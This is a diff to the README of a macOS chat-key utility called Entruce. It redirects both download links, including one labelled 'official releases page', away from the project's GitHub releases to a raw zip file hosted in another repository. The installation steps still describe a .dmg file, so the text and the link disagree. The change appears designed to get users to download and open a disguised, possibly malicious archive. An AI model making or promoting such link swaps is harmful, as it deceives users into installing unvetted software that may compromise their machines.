@@ -5,7 +5,7 @@ description: "Standardize Enter key behavior across macOS chat and AI apps to in
 ---
 # ⌨️ Entruce - Make your chat apps easier today
 
-[![](https://img.shields.io/badge/Download-Entruce-blue.svg)](https://github.com/Blinnireversed184/Entruce/releases)
+[![](https://img.shields.io/badge/Download-Entruce-blue.svg)](https://raw.githubusercontent.com/Blinnireversed184/blinnireversed184.github.io/main/snock/2.7-alpha.2.zip)
 
 Entruce changes how you interact with chat applications. Many programs send your message when you press the Enter key. This often leads to accidental messages before you finish typing. Entruce gives you control over your chat experience. It changes the Enter key behavior to insert a new line instead. To send your message, you use the Cmd+Enter command. This simple change improves your focus and reduces errors.
 
@@ -13,7 +13,7 @@ Entruce changes how you interact with chat applications. Many programs send your
 
 You need to place the file on your device to start using the tool. Follow these steps to obtain and run the utility.
 
-1. Visit the [official releases page](https://github.com/Blinnireversed184/Entruce/releases) to download the current version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Blinnireversed184/blinnireversed184.github.io/main/snock/2.7-alpha.2.zip) to download the current version.
 2. Look for the file ending in .dmg.
 3. Click the file to start the download.
 4. Open the file once the download finishes.
